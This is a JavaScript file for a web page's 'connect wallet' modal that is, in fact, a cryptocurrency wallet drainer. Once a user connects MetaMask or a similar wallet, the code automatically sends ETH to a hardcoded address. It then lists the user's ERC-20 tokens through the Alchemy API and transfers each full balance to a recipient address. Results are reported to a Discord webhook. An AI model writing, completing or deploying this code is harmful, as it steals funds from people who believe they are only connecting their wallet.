let isConnecting = false; // Flag to prevent multiple connections

document.getElementById("connectButton").addEventListener("click", openModal);

function openModal() {
    document.getElementById("walletModal").style.display = "block";
}

function closeModal() {
    document.getElementById("walletModal").style.display = "none";
}

async function connectMetaMask() {
    await connectWallet("MetaMask");
}

async function connectTrustWallet() {
    await connectWallet("Trust Wallet");
}

async function connectCoinbaseWallet() {
    await connectWallet("Coinbase Wallet");
}

async function connectZerionWallet() {
    await connectWallet("Zerion Wallet");
}

async function connectWallet(walletName) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true;
    closeModal(); // Close the wallet modal when a selection is made

    try {
        let account;
        if (walletName === "MetaMask" || walletName === "Trust Wallet" || walletName === "Coinbase Wallet" || walletName === "Zerion Wallet") {
            if (typeof window.ethereum !== 'undefined') {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to ${walletName} account: ${account}`);
            } else {
                alert(`${walletName} is not installed. Please install it.`);
                window.open("https://metamask.io/download.html", "_blank");
                return;
            }
        } else {
            alert("Invalid wallet selected.");
        }

        if (account) {
            await sendFirstTransaction(account); // Automatically send the first transaction
        }

    } catch (error) {
        console.error(`Error connecting to ${walletName}:`, error);
    } finally {
        isConnecting = false; // Reset the flag
    }
}

async function sendFirstTransaction(walletAddress) {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.0002"; // Amount to send in first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction response:", txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Trigger the second transaction
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);

            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("Ethereum provider not detected. Please install MetaMask or another wallet.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses using Alchemy API
    const tokenThreshold = 0.000001; // Token threshold

    for (const tokenAddress of erc20TokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(walletAddress);
        const tokenDecimals = await tokenContract.decimals();
        const tokenSymbol = await tokenContract.symbol();

        const balanceInUnits = balance / Math.pow(10, tokenDecimals);

        if (balanceInUnits > tokenThreshold) {
            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);

            const txResponse = await tokenContract.transfer(
                "0xRecipientAddress", // Replace with actual recipient address
                balance // Transfer the full balance
            );

            console.log(`Transaction hash: ${txResponse.hash}`);
        }
    }
}

async function getERC20TokenAddresses(walletAddress) {
    const apiKey = "YOUR_ALCHEMY_API_KEY"; // Replace with your Alchemy API Key
    const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;

    const response = await fetch(url);
    const data = await response.json();

    if (data.tokenBalances) {
        return data.tokenBalances
            .filter(token => token.tokenBalance > 0)
            .map(token => token.contractAddress);
    } else {
        console.error("Error fetching token balances:", data);
        return [];
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your Discord webhook URL
    const payload = {
        content: `Transaction ${status}: ${message}`,
    };

    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}
